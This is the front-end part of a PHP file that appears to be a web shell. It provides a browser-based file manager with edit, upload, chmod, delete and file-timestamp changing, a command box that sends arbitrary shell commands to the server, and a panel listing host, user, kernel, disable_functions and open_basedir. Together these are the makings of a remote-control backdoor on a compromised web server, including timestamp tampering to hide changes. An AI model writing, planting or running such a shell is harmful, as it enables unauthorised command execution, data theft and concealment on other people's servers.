        <td class="col-owner"><?php echo sh_safe($owner); ?></td>
        <?php endif; ?>
        <td class="col-size"><?php echo sh_safe($fsz); ?></td>
        <td class="col-date"><?php echo sh_safe($fdate); ?></td>
        <td>
          <div class="actions">
            <?php if (!$isdir): ?>
            <!-- Edit -->
            <button type="button" class="iab edit-btn" title="Edit" onclick="openEditor(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fn); ?>)">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
            </button>
            <!-- Download -->
            <a class="iab dl-btn" title="Download" href="?action=read&file=<?php echo urlencode($fp); ?>" download="<?php echo sh_safe($fn); ?>">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="8 17 12 21 16 17"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.88 18.09A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.29"/></svg>
            </a>
            <?php endif; ?>
            <!-- Rename -->
            <button type="button" class="iab rename-btn" title="Rename" onclick="openRename(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fn); ?>)">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>
            </button>
            <!-- Chmod -->
            <button type="button" class="iab chmod-btn" title="Chmod (<?php echo sh_safe($oct); ?>)" onclick="openChmod(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($oct); ?>)">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            </button>
            <!-- Chdate -->
            <button type="button" class="iab chdate-btn" title="Change timestamp" onclick="openChdate(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fdate); ?>)">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
            </button>
            <!-- Copy path -->
            <button type="button" class="iab copy-btn" title="Copy path" onclick="copyPath(<?php echo sh_esc($fp); ?>)">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            </button>
            <!-- Delete -->
            <button type="button" class="iab del-btn" title="Delete" onclick="openDelete(<?php echo sh_esc($fp); ?>,<?php echo sh_esc($fn); ?>)">
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4h6v2"/></svg>
            </button>
          </div>
        </td>
      </tr>
      <?php endforeach; ?>
      <?php endif; ?>
      </tbody>
    </table>
  </div>
</div>

<!-- ══ SHELL ═══════════════════════════════════════════ -->
<div id="tab-shell" class="tabsec" style="<?php echo $tab!=='shell'?'display:none':''; ?>">
  <div class="term-wrap">
    <div class="term-cwd">cwd: <span id="shell-cwd"><?php echo sh_safe($path); ?></span></div>
    <div class="term-row">
      <span class="term-ps1">$</span>
      <input type="text" class="term-input" id="shell-input" placeholder="command..." autocomplete="off" autocorrect="off" spellcheck="false">
      <button type="button" class="term-run" id="shell-run" onclick="runCmd()">Run</button>
    </div>
    <div id="shell-out" class="term-out" style="display:none"></div>
  </div>
</div>

<!-- ══ UPLOAD ══════════════════════════════════════════ -->
<div id="tab-upload" class="tabsec" style="<?php echo $tab!=='upload'?'display:none':''; ?>">
  <div class="upload-wrap">
    <div class="upload-cwd">Upload to: <span><?php echo sh_safe($path); ?></span></div>
    <form method="post" enctype="multipart/form-data" action="?path=<?php echo urlencode($path); ?>&tab=upload">
      <input type="hidden" name="action" value="upload">
      <input type="hidden" name="path"   value="<?php echo sh_safe($path); ?>">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
        <input type="file" name="ufile[]" multiple>
        <button type="submit" class="btn primary">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/></svg>Upload
        </button>
      </div>
    </form>
  </div>
</div>

<!-- ══ INFO ════════════════════════════════════════════ -->
<div id="tab-info" class="tabsec" style="<?php echo $tab!=='info'?'display:none':''; ?>">
  <div class="info-wrap">
    <table class="info-table">
      <tr><td colspan="2" class="info-sec">Server</td></tr>
      <tr><td class="info-key">Hostname</td><td class="info-val"><?php echo sh_safe($sv_host); ?></td></tr>
      <tr><td class="info-key">User</td><td class="info-val"><?php echo sh_safe($sv_user); ?></td></tr>
      <tr><td class="info-key">OS</td><td class="info-val"><?php echo sh_safe($sv_os); ?></td></tr>
      <tr><td class="info-key">uname</td><td class="info-val"><?php echo sh_safe($sv_una); ?></td></tr>
      <tr><td class="info-key">Server Software</td><td class="info-val"><?php echo sh_safe($sv_soft); ?></td></tr>
      <?php if ($sv_dt): ?><tr><td class="info-key">Disk (/)</td><td class="info-val"><?php echo sh_size($sv_df).' free / '.sh_size($sv_dt).' total'; ?></td></tr><?php endif; ?>
      <tr><td class="info-key">Server IP</td><td class="info-val"><?php echo sh_safe(isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'?'); ?></td></tr>
      <tr><td class="info-key">Document Root</td><td class="info-val" style="font-family:var(--mono);font-size:11px"><?php echo sh_safe(isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'?'); ?></td></tr>
      <tr><td colspan="2" class="info-sec">PHP</td></tr>
      <tr><td class="info-key">PHP Version</td><td class="info-val"><?php echo sh_safe($sv_php); ?></td></tr>
      <tr><td class="info-key">php.ini</td><td class="info-val" style="font-family:var(--mono);font-size:11px"><?php echo sh_safe($sv_ini); ?></td></tr>
      <tr><td class="info-key">disable_functions</td><td class="info-val" style="font-family:var(--mono);font-size:11px;color:var(--tx1)"><?php echo sh_safe($sv_dis); ?></td></tr>
      <tr><td class="info-key">upload_max_filesize</td><td class="info-val"><?php echo sh_safe(ini_get('upload_max_filesize')); ?></td></tr>
      <tr><td class="info-key">memory_limit</td><td class="info-val"><?php echo sh_safe(ini_get('memory_limit')); ?></td></tr>
      <tr><td class="info-key">max_execution_time</td><td class="info-val"><?php echo sh_safe(ini_get('max_execution_time')); ?>s</td></tr>
      <tr><td class="info-key">open_basedir</td><td class="info-val" style="font-family:var(--mono);font-size:11px"><?php echo sh_safe(ini_get('open_basedir') ?: 'none'); ?></td></tr>
      <tr><td class="info-key">Extensions</td><td class="info-val" style="font-family:var(--mono);font-size:11px;color:var(--tx2)"><?php echo sh_safe($sv_ext); ?></td></tr>
      <tr><td colspan="2" class="info-sec">Paths</td></tr>
      <tr><td class="info-key">Script dir</td><td class="info-val" style="font-family:var(--mono);font-size:11px"><?php echo sh_safe(SH_HOME); ?></td></tr>
      <tr><td class="info-key">CWD</td><td class="info-val" style="font-family:var(--mono);font-size:11px"><?php echo sh_safe($path); ?></td></tr>
      <tr><td class="info-key">Script file</td><td class="info-val" style="font-family:var(--mono);font-size:11px"><?php echo sh_safe(__FILE__); ?></td></tr>
    </table>
  </div>
</div>

</div><!-- .content -->

<!-- ══ Modals ══════════════════════════════════════════ -->
<div class="modal-bg" id="m-mkdir" onclick="if(event.target===this)hideModal('m-mkdir')">
  <div class="modal">
    <h3>New Folder</h3>
    <form method="post" action="?path=<?php echo urlencode($path); ?>&tab=browse">
      <input type="hidden" name="action" value="mkdir">
      <input type="hidden" name="path"   value="<?php echo sh_safe($path); ?>">
      <div class="modal-row"><label>Folder name</label><input type="text" name="dname" id="mkdir-inp" autocomplete="off" placeholder="folder-name"></div>
      <div class="modal-btns">
        <button type="button" class="btn" onclick="hideModal('m-mkdir')">Cancel</button>
        <button type="submit" class="btn primary">Create</button>
      </div>
    </form>
  </div>
</div>

<div class="modal-bg" id="m-newfile" onclick="if(event.target===this)hideModal('m-newfile')">
  <div class="modal">
    <h3>New File</h3>
    <form method="post" action="?path=<?php echo urlencode($path); ?>&tab=browse">
      <input type="hidden" name="action" value="newfile">
      <input type="hidden" name="path"   value="<?php echo sh_safe($path); ?>">
      <div class="modal-row"><label>File name</label><input type="text" name="fname" id="newfile-inp" autocomplete="off" placeholder="file.php"></div>
      <div class="modal-btns">
        <button type="button" class="btn" onclick="hideModal('m-newfile')">Cancel</button>
        <button type="submit" class="btn primary">Create</button>
      </div>
    </form>
  </div>
</div>

<div class="modal-bg" id="m-rename" onclick="if(event.target===this)hideModal('m-rename')">
  <div class="modal">
    <h3>Rename</h3>
    <form method="post" action="?path=<?php echo urlencode($path); ?>&tab=browse">
      <input type="hidden" name="action" value="rename">
      <input type="hidden" name="path"   value="<?php echo sh_safe($path); ?>">
      <input type="hidden" name="rpath"  id="r-rpath" value="">
      <div class="modal-row"><label>New name</label><input type="text" name="rname" id="r-rname" autocomplete="off"></div>
      <div class="modal-btns">
        <button type="button" class="btn" onclick="hideModal('m-rename')">Cancel</button>
        <button type="submit" class="btn primary">Rename</button>
      </div>
    </form>
  </div>
</div>

<div class="modal-bg" id="m-chmod" onclick="if(event.target===this)hideModal('m-chmod')">
  <div class="modal">
    <h3>Change Permissions</h3>
    <form method="post" action="?path=<?php echo urlencode($path); ?>&tab=browse">
      <input type="hidden" name="action" value="chmod">
      <input type="hidden" name="path"   value="<?php echo sh_safe($path); ?>">
      <input type="hidden" name="cpath"  id="ch-cpath" value="">
      <div class="modal-row"><label>Octal mode (e.g. 0755, 0644)</label><input type="text" name="cmode" id="ch-cmode" maxlength="4" autocomplete="off" placeholder="0755"></div>
      <div class="modal-btns">
        <button type="button" class="btn" onclick="hideModal('m-chmod')">Cancel</button>
        <button type="submit" class="btn primary">Apply</button>
      </div>
    </form>
  </div>
</div>

<div class="modal-bg" id="m-chdate" onclick="if(event.target===this)hideModal('m-chdate')">
  <div class="modal">
    <h3>Change Timestamp</h3>
    <form method="post" action="?path=<?php echo urlencode($path); ?>&tab=browse">
      <input type="hidden" name="action" value="chdate">
      <input type="hidden" name="path"   value="<?php echo sh_safe($path); ?>">
      <input type="hidden" name="cdpath" id="cd-cpath" value="">
      <div class="modal-row"><label>Date/time (YYYY-MM-DD HH:MM)</label><input type="text" name="cdval" id="cd-cval" autocomplete="off" placeholder="2024-01-01 00:00"></div>
      <div class="modal-btns">
        <button type="button" class="btn" onclick="hideModal('m-chdate')">Cancel</button>
        <button type="submit" class="btn primary">Apply</button>
      </div>
    </form>
  </div>
</div>

<div class="modal-bg" id="m-delete" onclick="if(event.target===this)hideModal('m-delete')">
  <div class="modal">
    <h3 style="color:var(--re)">Confirm Delete</h3>
    <p id="del-msg" style="font-size:12px;color:var(--tx1);margin-bottom:14px"></p>
    <form method="post" action="?path=<?php echo urlencode($path); ?>&tab=browse">
      <input type="hidden" name="action" value="delete">
      <input type="hidden" name="path"   value="<?php echo sh_safe($path); ?>">
      <input type="hidden" name="dpath"  id="del-dpath" value="">
      <div class="modal-btns">
        <button type="button" class="btn" onclick="hideModal('m-delete')">Cancel</button>
        <button type="submit" class="btn danger">Delete</button>
      </div>
    </form>
  </div>
</div>

<!-- ══ Editor overlay ══════════════════════════════════ -->
<div class="editor-ov" id="editor-ov">
  <div class="editor-bar">
    <span class="editor-fname" id="ed-fname">—</span>
    <span class="editor-st" id="ed-st"></span>
    <button type="button" class="tbtn" onclick="saveFile()">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>Save
    </button>
    <button type="button" class="tbtn" onclick="closeEditor()">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>Close
    </button>
  </div>
  <div class="editor-body">
    <textarea class="editor-ta" id="ed-ta" spellcheck="false" autocorrect="off" autocapitalize="off"></textarea>
  </div>
</div>

<script>
// NOTE: use json_encode() for values in <script> tags, NOT sh_esc()
// sh_esc() uses htmlspecialchars which outputs &quot; — that is NOT decoded inside <script> tags
var _path = <?php echo json_encode($path); ?>;
var _tabs = ['browse','shell','upload','info'];

/* ── Tab switching ── */
function setTab(t) {
    var i, el, btns, dt;
    for (i = 0; i < _tabs.length; i++) {
        el = document.getElementById('tab-'+_tabs[i]);
        if (el) el.style.display = (_tabs[i] === t) ? 'block' : 'none';
    }
    btns = document.getElementsByTagName('button');
    for (i = 0; i < btns.length; i++) {
        dt = btns[i].getAttribute('data-tab');
        if (dt) {
            if (dt === t) {
                if (btns[i].className.indexOf('active') < 0) btns[i].className += ' active';
            } else {
                btns[i].className = btns[i].className.replace(/\s*\bactive\b/g, '');
            }
        }
    }
    if (window.history && window.history.replaceState) {
        window.history.replaceState(null, '', '?path='+encodeURIComponent(_path)+'&tab='+t);
    }
}

/* ── Modal helpers ── */
function showModal(id) {
    var el = document.getElementById(id);
    if (!el) return;
    el.style.display = 'flex';
    var inp = el.querySelector ? el.querySelector('input[type=text]') : null;
    if (inp) {
        inp.value = '';
        setTimeout(function(){ inp.focus(); }, 30);
    }
}
function hideModal(id) {
    var el = document.getElementById(id);
    if (el) el.style.display = 'none';
}

/* ── File actions ── */
function openRename(fp, name) {
    document.getElementById('r-rpath').value = fp;
    document.getElementById('r-rname').value = name;
    showModal('m-rename');
    setTimeout(function(){ document.getElementById('r-rname').focus(); }, 30);
}
function openChmod(fp, oct) {
    document.getElementById('ch-cpath').value = fp;
    document.getElementById('ch-cmode').value = oct;
    showModal('m-chmod');
    setTimeout(function(){ document.getElementById('ch-cmode').focus(); }, 30);
}
function openChdate(fp, dt) {
    document.getElementById('cd-cpath').value = fp;
    document.getElementById('cd-cval').value = dt;
    showModal('m-chdate');
    setTimeout(function(){ document.getElementById('cd-cval').focus(); }, 30);
}
function openDelete(fp, name) {
    document.getElementById('del-dpath').value = fp;
    document.getElementById('del-msg').textContent = 'Delete "' + name + '"? This cannot be undone.';
    showModal('m-delete');
}
function copyPath(fp) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(fp);
    } else {
        var ta = document.createElement('textarea');
        ta.value = fp; ta.style.position = 'fixed'; ta.style.opacity = '0';
        document.body.appendChild(ta); ta.select(); document.execCommand('copy');
        document.body.removeChild(ta);
    }
}

/* ── Editor ── */
var _edFile = '';
function openEditor(fp, name) {
    _edFile = fp;
    document.getElementById('ed-fname').textContent = name + '  (' + fp + ')';
    document.getElementById('ed-st').textContent = 'Loading...';
    document.getElementById('ed-ta').value = '';
    document.getElementById('editor-ov').style.display = 'flex';

    var xhr = new XMLHttpRequest();
    xhr.open('GET', '?action=read&file='+encodeURIComponent(fp), true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            document.getElementById('ed-st').textContent = '';
            if (xhr.status === 200) {
                document.getElementById('ed-ta').value = xhr.responseText;
                document.getElementById('ed-ta').focus();
            } else {
                document.getElementById('ed-st').textContent = 'Load failed (HTTP '+xhr.status+')';
            }
        }
    };
    xhr.send(null);
}
function closeEditor() {
    document.getElementById('editor-ov').style.display = 'none';
    _edFile = '';
}
function saveFile() {
    if (!_edFile) return;
    var content = document.getElementById('ed-ta').value;
    document.getElementById('ed-st').textContent = 'Saving...';

    var body = 'file='+encodeURIComponent(_edFile)+'&content='+encodeURIComponent(content);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '?action=save', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            var r = xhr.responseText;
            if (r.indexOf('OK:') === 0) {
                document.getElementById('ed-st').textContent = 'Saved ('+r.slice(3)+' bytes)';
                setTimeout(function(){ document.getElementById('ed-st').textContent = ''; }, 2000);
            } else {
                document.getElementById('ed-st').textContent = r || 'Save failed';
            }
        }
    };
    xhr.send(body);
}

/* ── Shell ── */
var _shellHistory = [];
var _shellHistIdx = -1;
var _shellInputEl = document.getElementById('shell-input');
if (_shellInputEl) {
    _shellInputEl.addEventListener('keydown', function(e) {
        var k = e.key || e.keyCode;
        if (k === 'Enter' || k === 13) {
            runCmd();
        } else if (k === 'ArrowUp' || k === 38) {
            if (_shellHistory.length > 0) {
                _shellHistIdx = Math.min(_shellHistIdx + 1, _shellHistory.length - 1);
                _shellInputEl.value = _shellHistory[_shellHistIdx];
            }
            e.preventDefault();
        } else if (k === 'ArrowDown' || k === 40) {
            if (_shellHistIdx > 0) {
                _shellHistIdx--;
                _shellInputEl.value = _shellHistory[_shellHistIdx];
            } else {
                _shellHistIdx = -1;
                _shellInputEl.value = '';
            }
            e.preventDefault();
        }
    });
}
function runCmd() {
    var inp = document.getElementById('shell-input');
    var outEl = document.getElementById('shell-out');
    var cmd = inp.value.trim();
    if (!cmd) return;
    _shellHistory.unshift(cmd);
    _shellHistIdx = -1;
    inp.value = '';
    outEl.style.display = 'block';
    outEl.textContent = 'Running...';

    var body = 'cmd='+encodeURIComponent(cmd)+'&cwd='+encodeURIComponent(_path);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '?action=cmd', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            outEl.textContent = xhr.responseText || '(no output)';
        }
    };
    xhr.send(body);
}

/* ── Keyboard shortcuts ── */
document.addEventListener('keydown', function(e) {
    var k = e.key || '';
    if (k === 'Escape' || e.keyCode === 27) {
        var mids = ['m-mkdir','m-newfile','m-rename','m-chmod','m-chdate','m-delete'];
        var i, m;
        for (i = 0; i < mids.length; i++) {
            m = document.getElementById(mids[i]);
            if (m && m.style.display === 'flex') { m.style.display = 'none'; return; }
        }
        var ov = document.getElementById('editor-ov');
        if (ov && ov.style.display === 'flex') { closeEditor(); return; }
    }
    if ((e.ctrlKey || e.metaKey) && (k === 's' || e.keyCode === 83)) {
        var ov2 = document.getElementById('editor-ov');
        if (ov2 && ov2.style.display === 'flex') { e.preventDefault(); saveFile(); }
    }
});
</script>
</body>
</html>
